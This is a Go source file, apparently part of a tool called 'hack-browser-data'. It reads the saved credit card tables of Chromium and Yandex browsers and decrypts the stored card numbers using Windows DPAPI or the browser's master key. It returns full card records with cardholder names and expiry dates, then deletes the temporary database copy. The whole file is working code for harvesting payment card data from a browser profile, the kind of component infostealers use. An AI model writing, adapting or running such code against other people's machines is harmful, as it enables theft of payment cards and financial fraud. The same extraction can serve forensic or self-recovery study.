package creditcard

import (
	"database/sql"
	"os"

	_ "github.com/mattn/go-sqlite3"

	"hack-browser-data/internal/decrypter"
	"hack-browser-data/internal/item"
	"hack-browser-data/internal/log"
)

type ChromiumCreditCard []card

type card struct {
	GUID            string
	Name            string
	ExpirationYear  string
	ExpirationMonth string
	CardNumber      string
	Address         string
	NickName        string
}

const (
	queryChromiumCredit = `SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards`
)

func (c *ChromiumCreditCard) Parse(masterKey []byte) error {
	creditDB, err := sql.Open("sqlite3", item.TempChromiumCreditCard)
	if err != nil {
		return err
	}
	defer os.Remove(item.TempChromiumCreditCard)
	defer creditDB.Close()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, month, year, guid, address, nickname string
			value, encryptValue                        []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue, &address, &nickname); err != nil {
			log.Warn(err)
		}
		ccInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
			Address:         address,
			NickName:        nickname,
		}
		if masterKey == nil {
			value, err = decrypter.DPApi(encryptValue)
			if err != nil {
				return err
			}
		} else {
			value, err = decrypter.Chromium(masterKey, encryptValue)
			if err != nil {
				return err
			}
		}
		ccInfo.CardNumber = string(value)
		*c = append(*c, ccInfo)
	}
	return nil
}

func (c *ChromiumCreditCard) Name() string {
	return "creditcard"
}

type YandexCreditCard []card

func (c *YandexCreditCard) Parse(masterKey []byte) error {
	creditDB, err := sql.Open("sqlite3", item.TempYandexCreditCard)
	if err != nil {
		return err
	}
	defer os.Remove(item.TempYandexCreditCard)
	defer creditDB.Close()
	defer creditDB.Close()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, month, year, guid, address, nickname string
			value, encryptValue                        []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue, &address, &nickname); err != nil {
			log.Warn(err)
		}
		ccInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
			Address:         address,
			NickName:        nickname,
		}
		if masterKey == nil {
			value, err = decrypter.DPApi(encryptValue)
			if err != nil {
				return err
			}
		} else {
			value, err = decrypter.Chromium(masterKey, encryptValue)
			if err != nil {
				return err
			}
		}
		ccInfo.CardNumber = string(value)
		*c = append(*c, ccInfo)
	}
	return nil
}

func (c *YandexCreditCard) Name() string {
	return "creditcard"
}
